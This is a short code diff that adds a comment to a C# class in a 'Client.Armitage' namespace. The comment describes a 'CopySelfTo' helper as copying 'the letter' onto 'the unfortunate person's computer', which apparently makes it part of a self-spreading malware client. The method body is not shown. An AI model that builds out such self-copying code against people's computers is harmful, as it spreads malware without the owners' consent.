@@ -7,6 +7,9 @@ using System.Threading.Tasks;
 
 namespace Client.Armitage
 {
+    /// <summary>
+    /// A helper class for copying the letter to any location to the unfortunate person's computer.
+    /// </summary>
     public static class Copy
     {
         public static bool CopySelfTo(string target, bool overwrite = true)
